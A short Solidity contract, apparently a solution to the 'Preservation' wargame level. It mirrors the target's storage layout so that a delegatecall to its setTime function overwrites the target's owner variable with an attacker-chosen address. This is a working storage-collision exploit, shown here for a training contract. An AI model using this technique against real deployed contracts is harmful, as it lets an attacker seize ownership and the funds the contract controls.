// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Used as delegateee to overwrite the owner storage variable of the Preservation contract
contract PreservationAttack {
    address dummy;
    address dummy2;
    address owner;
    uint256 storedTime;

    constructor() {}

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
